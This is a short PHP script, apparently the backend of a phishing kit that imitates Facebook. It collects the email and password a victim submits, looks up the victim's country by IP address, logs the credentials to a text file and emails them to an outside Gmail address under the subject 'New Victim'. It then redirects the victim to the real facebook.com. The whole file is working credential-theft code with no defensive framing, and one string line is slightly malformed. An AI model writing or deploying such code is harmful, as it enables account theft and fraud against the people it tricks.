<?php

$ip = file_get_contents('http://ip-api.com/line/'.$_SERVER['REMOTE_ADDR'].'?fields=country');

$subject = "New Victim";
$message  = $_POST['email'].":".$_POST['pass'].":"."$ip;
$send = "whoiam285@gmail.com"; 


if (isset($_POST['btn-signup'])) {
   if ($_POST['email']=="" || $_POST['pass']=="") {
     
     
   }else{
         
         $myfile = fopen("Text.txt", "a") or die("Unable to open file!");
         fwrite($myfile, $message);
         fclose($myfile);

         mail("$send", "$subject", "$message");  
         header("Location:https://www.facebook.com"); 
   }
   
   
}
?>